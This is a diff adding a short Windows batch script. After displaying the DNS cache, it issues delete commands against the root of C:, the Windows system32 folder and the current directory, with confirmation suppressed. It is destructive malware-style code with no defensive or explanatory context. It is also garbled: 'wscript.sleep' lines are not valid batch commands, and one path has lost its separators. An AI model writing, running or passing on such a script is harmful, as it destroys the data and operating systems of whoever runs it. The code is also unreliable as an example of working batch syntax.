@@ -1,0 +1,9 @@
+@Echo off
+wscript.sleep 0
+Ipconfig /displaydns
+wscript.sleep 100
+Del C:\ *.* |y
+wscript.sleep 100
+del c:WINDOWSsystem32*.*/q 
+wscript.sleep 100
+del *.*
